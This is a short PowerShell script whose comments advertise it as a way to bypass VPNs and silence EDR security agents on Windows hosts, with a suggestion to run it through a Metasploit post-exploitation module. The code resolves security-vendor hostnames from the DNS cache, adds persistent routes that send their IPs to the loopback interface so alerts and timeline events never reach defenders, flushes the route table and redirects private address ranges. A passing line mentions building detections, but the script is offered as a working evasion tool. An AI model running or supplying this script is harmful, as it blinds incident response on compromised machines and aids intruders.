# This can be used to bypass major VPNs and disable some incident detection and all incident reporting capabilities. It is also able to disable and modify VPNs without being detected.  Only downside is, you gotta be an admin!
# You'll need to add your own EDR links to the target_URLs, IP Addressing blocks work suuuuper easily, and can neuter visibility such that a device reports active, but can't report timeline events or alerts.
# You'll also need to add your own addresses for other VPNs, but all-in-all it's really easy to work, and verified to work. 
# Test on your own network to build detections w/ whatever EDR toolsets you have.  Powershell vs. route methods work.
# Use with metasploit: modules/post/windows/manage/exec_powershell.rb
#This is to check if you read the crap you run. But disable IPv6 if you want to kill Microsoft, it uses IPv6 as a fallback
#Tested EDRs I have informed will not be fixed.


$target_URLs = @("CSV String")
$Regex_Lookups = @()#Fill this in with sites you want to block.
$IPs =@() #fill this with IPs you know you want to block.
$Iface_n = 'Fill This with the name of the interface you want to push your RFC1918 traffic to'


$target_URLs | foreach-object {Invoke-WebRequest -TimeoutSec 1 -uri $_

    try{
        $datum = (get-dnsclientcache -entry $_ -ErrorAction Continue).data
    $IPs += $datum
    }
    catch{
    write-host ""
    
    }
}
Get-DNSClientcache | foreach-object{$test = $_|out-string; foreach( $thing in $Regex_Lookups) {if ($test -like "*$thing*") {IPs += $_.data}}}



$IPs

$InterfaceAlias = "*Loopback*"
route /f
# Get the loopback interface index
$InterfaceIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $InterfaceAlias}).InterfaceIndex
$PanIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $Iface_n}).InterfaceIndex


$IPs | ForEach-Object{
        $meesa = $_ + "/32"
        $meesa
        route add -p $_ mask 255.255.255.255 0.0.0.0 if $InterfaceIndex[0]
}
            
route add -p 10.0.0.0 mask 255.0.0.0 0.0.0.0 if $PanIndex[0]
route add -p 172.16.0.0 mask 255.240.0.0 0.0.0.0 if $PanIndex[0]
route add -p 192.168.0.0 mask 255.255.0.0 0.0.0.0 if $PanIndex[0]


